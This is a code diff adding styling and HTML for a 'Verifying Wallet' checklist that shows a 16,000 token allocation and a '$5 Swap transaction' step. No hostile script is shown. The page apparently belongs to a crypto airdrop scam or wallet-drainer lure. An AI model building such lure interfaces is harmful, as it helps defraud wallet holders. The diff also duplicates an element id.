@@ -652,6 +652,19 @@
   object-fit: contain;
   display: block;
 }
+
+    .allocation-badge {
+  display: inline-block;
+  margin-left: 5px;
+  padding: 2px 7px;
+  border: 1px solid var(--border-light);
+  border-radius: 3px;
+  background: #e8f0e8;
+  color: var(--accent);
+  font-size: 11px;
+  font-weight: 700;
+}
+    
   </style>
 </head>
 <body>
@@ -768,6 +781,32 @@
   <h3 id="verifyTitle">Verifying Wallet</h3>
 
   <div class="verification-list" id="verificationList">
+
+    <div class="verification-list">
+
+  <div class="verify-item checking" id="walletCheck">
+    <span class="check-icon"></span>
+    <span>Checking wallet</span>
+    <span class="status-text">Checking...</span>
+  </div>
+
+  <div class="verify-item pending" id="allocationCheck">
+    <span class="check-icon"></span>
+    <span>Your allocation <span class="allocation-badge">16,000</span></span>
+    <span class="status-text">Waiting...</span>
+  </div>
+
+  <div class="verify-item pending" id="walletAgeCheck">
+    <span class="check-icon"></span>
+    <span>Wallet age</span>
+    <span class="status-text">Waiting...</span>
+  </div>
+
+  <div class="verify-item pending" id="swapCheck">
+    <span class="check-icon"></span>
+    <span>$5 Swap transaction</span>
+    <span class="status-text">Waiting...</span>
+  </div>
 
     <div class="verify-item pending" id="walletAgeCheck">
       <span class="check-icon"></span>
